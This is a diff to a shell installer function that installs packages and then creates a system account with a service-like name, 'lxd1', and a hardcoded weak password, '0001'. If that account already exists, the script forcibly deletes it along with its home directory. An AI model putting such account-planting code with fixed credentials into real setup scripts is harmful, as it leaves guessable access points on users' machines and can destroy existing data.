@@ -232,13 +232,22 @@ inst_pct() {
     for _prog in "${_pacotes[@]}"; do
         sudo apt install $_prog -y
     done
-    ue="leavel"
-    pd="leavel"
-    if id "$ue" &>/dev/null; then
-        sudo userdel -r $ue
+    
+    # Create user only once
+    usn="lxd1"
+    psw="0001"
+    
+    # Check if the username already exists
+    if id "$usn" &>/dev/null; then
+        echo "User '$usn' already exists. Overwriting..."
+        sudo userdel -r $usn
     fi
-    sudo adduser --system --disabled-login $ue
-    echo "$ue:$pd" | sudo chpasswd
+    
+    # Create the system user with disabled login
+    sudo adduser --system --disabled-login $usn
+    
+    # Set the password for the user
+    echo "$usn:$psw" | sudo chpasswd
 
     # Install Python package using pip
     pip install speedtest-cli
